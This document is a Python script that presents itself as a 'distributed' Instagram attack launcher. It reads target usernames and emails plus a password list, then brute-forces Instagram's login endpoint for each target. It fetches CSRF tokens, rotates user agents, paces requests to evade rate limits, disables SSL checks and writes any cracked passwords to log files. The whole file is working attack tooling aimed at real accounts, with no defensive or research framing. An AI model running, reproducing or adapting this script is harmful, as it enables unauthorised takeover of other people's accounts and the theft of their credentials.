#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🚀 QUICK DISTRIBUTED ATTACK LAUNCHER 🚀
Simple launcher for continuing Instagram attacks from previous session
"""

import asyncio
import json
import os
import sys
from datetime import datetime

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

def load_targets():
    """📁 Load targets from brute_targets.json"""
    possible_paths = [
        '/workspaces/sugarglitch-realops/brute_targets.json',
        '../brute_targets.json',
        'brute_targets.json'
    ]
    
    for path in possible_paths:
        try:
            with open(path, 'r') as f:
                targets_data = json.load(f)
                print(f"✅ Loaded {len(targets_data)} targets from {path}")
                return targets_data
        except FileNotFoundError:
            continue
    
    print("❌ Could not find brute_targets.json!")
    return []

def load_passwords():
    """📁 Load passwords from file"""
    possible_paths = [
        '/workspaces/sugarglitch-realops/passwords.txt',
        '../passwords.txt',
        'passwords.txt'
    ]
    
    for path in possible_paths:
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
                print(f"✅ Loaded {len(passwords):,} passwords from {path}")
                return passwords
        except FileNotFoundError:
            continue
    
    print("❌ Could not find passwords file!")
    return []

async def quick_attack(target_username, passwords, rate_limit_delay=3.0):
    """🎯 Quick single-target attack"""
    import aiohttp
    import random
    
    print(f"\n🎯 Starting quick attack on: {target_username}")
    print(f"🔢 Passwords to test: {len(passwords):,}")
    print(f"⏱️  Rate limit delay: {rate_limit_delay}s")
    
    # Instagram endpoints
    csrf_url = 'https://www.instagram.com/accounts/login/'
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    
    # User agents for rotation
    user_agents = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/118.0',
        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'
    ]
    
    success_count = 0
    failed_count = 0
    rate_limited_count = 0
    
    async def get_csrf_token(session):
        """Get CSRF token"""
        try:
            async with session.get(csrf_url) as response:
                if response.status == 200:
                    text = await response.text()
                    if '"csrf_token":"' in text:
                        token = text.split('"csrf_token":"')[1].split('"')[0]
                        return token
                    elif 'csrftoken=' in text:
                        token = text.split('csrftoken=')[1].split(';')[0]
                        return token
                return None
        except:
            return None
    
    async def attempt_login(session, password):
        """Single login attempt"""
        nonlocal success_count, failed_count, rate_limited_count
        
        try:
            # Get CSRF token
            csrf_token = await get_csrf_token(session)
            if not csrf_token:
                failed_count += 1
                return False
            
            # Prepare login data
            headers = {
                'User-Agent': random.choice(user_agents),
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': csrf_url,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            data = {
                'username': target_username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }
            
            # Random delay
            await asyncio.sleep(random.uniform(rate_limit_delay, rate_limit_delay + 2))
            
            # Send login request
            async with session.post(login_url, data=data, headers=headers) as response:
                response_text = await response.text()
                text_lower = response_text.lower()
                
                # Check for success
                if any(indicator in text_lower for indicator in ['authenticated', '"status":"ok"', 'logged_in_user']):
                    success_count += 1
                    print(f"🎉 SUCCESS! Password found: {password}")
                    
                    # Save success
                    os.makedirs('logs', exist_ok=True)
                    success_data = {
                        'username': target_username,
                        'password': password,
                        'timestamp': datetime.now().isoformat()
                    }
                    with open(f'logs/success_{target_username}.json', 'w') as f:
                        json.dump(success_data, f, indent=2)
                    
                    return True
                
                # Check for rate limiting
                elif response.status == 429 or any(indicator in text_lower for indicator in ['rate_limited', 'please wait', 'too many requests']):
                    rate_limited_count += 1
                    print(f"⏳ Rate limited for: {password}")
                    return None
                
                else:
                    failed_count += 1
                    print(f"❌ Failed: {password}")
                    return False
                    
        except Exception as e:
            failed_count += 1
            print(f"💥 Error with {password}: {str(e)[:50]}")
            return False
    
    # Create session and attack
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for i, password in enumerate(passwords):
            print(f"[{i+1:,}/{len(passwords):,}] Testing: {password}")
            
            result = await attempt_login(session, password)
            
            if result is True:  # Success
                print(f"\n🎉 ATTACK SUCCESSFUL!")
                print(f"Target: {target_username}")
                print(f"Password: {password}")
                print(f"Attempts: {i+1}")
                return True
            
            # Progress update every 50 attempts
            if (i + 1) % 50 == 0:
                print(f"\n📊 Progress: {i+1:,}/{len(passwords):,}")
                print(f"   Success: {success_count}")
                print(f"   Failed: {failed_count}")
                print(f"   Rate Limited: {rate_limited_count}")
    
    print(f"\n💔 Attack completed without success")
    print(f"📊 Final Stats:")
    print(f"   Total attempts: {len(passwords):,}")
    print(f"   Failed: {failed_count:,}")
    print(f"   Rate Limited: {rate_limited_count:,}")
    return False

async def distributed_quick_attack():
    """🌊 Quick distributed attack on all targets"""
    
    targets = load_targets()
    passwords = load_passwords()
    
    if not targets or not passwords:
        print("❌ Missing targets or passwords!")
        return
    
    print(f"\n🚀 QUICK DISTRIBUTED ATTACK")
    print(f"🎯 Targets: {len(targets)}")
    print(f"🔢 Passwords: {len(passwords):,}")
    
    # Configuration
    rate_delay = float(input("\n⏱️  Rate limit delay (seconds, default=3.0): ") or "3.0")
    
    successful_targets = []
    
    for i, target in enumerate(targets):
        print(f"\n{'='*60}")
        print(f"🎯 Target {i+1}/{len(targets)}: {target['username']}")
        print(f"📧 Email: {target['email']}")
        print(f"{'='*60}")
        
        success = await quick_attack(target['username'], passwords, rate_delay)
        
        if success:
            successful_targets.append(target['username'])
            print(f"✅ {target['username']} - PWNED!")
        else:
            print(f"❌ {target['username']} - Failed")
        
        # Cooldown between targets
        if i < len(targets) - 1:
            cooldown = 10
            print(f"\n🔄 Cooling down for {cooldown} seconds before next target...")
            await asyncio.sleep(cooldown)
    
    # Final summary
    print(f"\n{'='*80}")
    print(f"📊 DISTRIBUTED ATTACK COMPLETED")
    print(f"{'='*80}")
    print(f"🎯 Total targets: {len(targets)}")
    print(f"✅ Successful: {len(successful_targets)}")
    print(f"❌ Failed: {len(targets) - len(successful_targets)}")
    
    if successful_targets:
        print(f"\n🎉 SUCCESSFUL TARGETS:")
        for target in successful_targets:
            print(f"   ✅ {target}")
    
    print(f"\n📁 Results saved in logs/ directory")

def main():
    """🚀 Main launcher function"""
    
    print("🚀 QUICK DISTRIBUTED INSTAGRAM ATTACK LAUNCHER")
    print("💕 Continuing from previous brute force session...")
    print("=" * 60)
    
    print("\n📋 Available options:")
    print("1. Quick single target attack")
    print("2. Distributed attack (all targets)")
    print("3. Resume from specific target")
    
    choice = input("\nChoose option (1-3, default=2): ").strip() or "2"
    
    if choice == "1":
        targets = load_targets()
        passwords = load_passwords()
        
        if targets and passwords:
            print("\nAvailable targets:")
            for i, target in enumerate(targets):
                print(f"  {i+1}. {target['username']} ({target['email']})")
            
            target_idx = int(input(f"\nSelect target (1-{len(targets)}): ")) - 1
            if 0 <= target_idx < len(targets):
                asyncio.run(quick_attack(targets[target_idx]['username'], passwords))
    
    elif choice == "2":
        asyncio.run(distributed_quick_attack())
    
    elif choice == "3":
        print("🔄 Resume functionality coming soon...")
    
    else:
        print("❌ Invalid choice!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n⚠️  Attack interrupted by user!")
    except Exception as e:
        print(f"\n💥 Error: {e}")
